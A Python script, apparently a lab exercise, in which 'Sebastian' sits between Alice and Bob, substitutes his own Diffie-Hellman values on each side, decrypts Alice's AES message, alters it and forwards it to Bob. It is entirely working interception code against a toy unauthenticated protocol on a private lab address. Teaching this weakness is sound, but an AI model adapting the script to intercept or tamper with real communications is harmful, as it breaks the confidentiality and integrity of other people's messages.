# sebastian_mitm_attack.py
import socket
import random
import hashlib
import binascii
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Sebastian listens for Alice here:
MITM_HOST = "0.0.0.0"
MITM_PORT = 5000

# Real Bob:
BOB_HOST = "172.16.216.131"   # Bob's IP
BOB_PORT = 5000

def recv_line(conn):
    data = b""
    while not data.endswith(b"\n"):
        chunk = conn.recv(1)
        if not chunk:
            raise ConnectionError("Connection closed while reading line")
        data += chunk
    return data.decode().strip()

def send_line(conn, text: str):
    conn.sendall((text + "\n").encode())

def derive_aes_key(shared_int: int) -> bytes:
    shared_bytes = shared_int.to_bytes((shared_int.bit_length() + 7) // 8, "big")
    return hashlib.sha256(shared_bytes).digest()  # 32 bytes = AES-256

def main():
    # Listen for Alice
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind((MITM_HOST, MITM_PORT))
        listener.listen(1)
        print(f"[Sebastian MITM] Listening for Alice on {MITM_HOST}:{MITM_PORT} ...")

        alice_conn, alice_addr = listener.accept()
        with alice_conn:
            print("[Sebastian MITM] Alice connected from", alice_addr)

            # Connect to Bob
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bob_conn:
                print(f"[Sebastian MITM] Connecting to Bob at {BOB_HOST}:{BOB_PORT} ...")
                bob_conn.connect((BOB_HOST, BOB_PORT))
                print("[Sebastian MITM] Connected to Bob.")

                # --- 1) Get DH params from Bob ---
                line_from_bob = recv_line(bob_conn)
                p_str, g_str, B_orig_str = line_from_bob.split(",")
                p = int(p_str)
                g = int(g_str)
                B_orig = int(B_orig_str)
                print(f"[Sebastian MITM] From Bob: p={p}, g={g}, B_orig={B_orig}")

                # --- 2) Create fake DH side for Alice ---
                sA = random.randint(2, p - 2)
                B_for_Alice = pow(g, sA, p)
                print(f"[Sebastian MITM] For Alice: sA={sA}, B_for_Alice={B_for_Alice}")
                send_line(alice_conn, f"{p},{g},{B_for_Alice}")

                # Receive A from Alice
                A_from_Alice_str = recv_line(alice_conn)
                A_from_Alice = int(A_from_Alice_str)
                print("[Sebastian MITM] Got A_from_Alice:", A_from_Alice)

                # --- 3) Create fake DH side for Bob ---
                sB = random.randint(2, p - 2)
                A_for_Bob = pow(g, sB, p)
                print(f"[Sebastian MITM] For Bob: sB={sB}, A_for_Bob={A_for_Bob}")
                send_line(bob_conn, str(A_for_Bob))

                # --- 4) Compute two shared keys ---
                shared_with_Alice = pow(A_from_Alice, sA, p)
                key_A = derive_aes_key(shared_with_Alice)
                print("[Sebastian MITM] Shared with Alice:", shared_with_Alice)
                print("[Sebastian MITM] key_A (hex):", key_A.hex())

                shared_with_Bob = pow(B_orig, sB, p)
                key_B = derive_aes_key(shared_with_Bob)
                print("[Sebastian MITM] Shared with Bob:", shared_with_Bob)
                print("[Sebastian MITM] key_B (hex):", key_B.hex())

                # --- 5) Intercept encrypted message from Alice ---
                iv_hex_A = recv_line(alice_conn)
                ct_hex_A = recv_line(alice_conn)
                print("[Sebastian MITM] From Alice - IV (hex):", iv_hex_A)
                print("[Sebastian MITM] From Alice - Ciphertext (hex):", ct_hex_A)

                iv_A = binascii.unhexlify(iv_hex_A)
                ct_A = binascii.unhexlify(ct_hex_A)

                cipher_A = AES.new(key_A, AES.MODE_CFB, iv=iv_A)
                plaintext_bytes = cipher_A.decrypt(ct_A)
                try:
                    plaintext = plaintext_bytes.decode()
                except UnicodeDecodeError:
                    plaintext = plaintext_bytes.decode(errors="replace")

                print("[Sebastian MITM] Decrypted plaintext from Alice:", plaintext)

                # --- 6) MODIFY the message ---
                modified_text = plaintext + " [INTERCEPTED AND MODIFIED BY SEBASTIAN]"
                modified_bytes = modified_text.encode()
                print("[Sebastian MITM] Modified plaintext to send to Bob:", modified_text)

                # --- 7) Encrypt modified message with Bob's key ---
                iv_B = get_random_bytes(16)
                cipher_B = AES.new(key_B, AES.MODE_CFB, iv=iv_B)
                ct_B = cipher_B.encrypt(modified_bytes)

                iv_B_hex = binascii.hexlify(iv_B).decode()
                ct_B_hex = binascii.hexlify(ct_B).decode()

                print("[Sebastian MITM] To Bob - IV (hex):", iv_B_hex)
                print("[Sebastian MITM] To Bob - Ciphertext (hex):", ct_B_hex)

                # --- 8) Send to Bob ---
                send_line(bob_conn, iv_B_hex)
                send_line(bob_conn, ct_B_hex)

                print("[Sebastian MITM] Forwarded MODIFIED message to Bob.")

if __name__ == "__main__":
    main()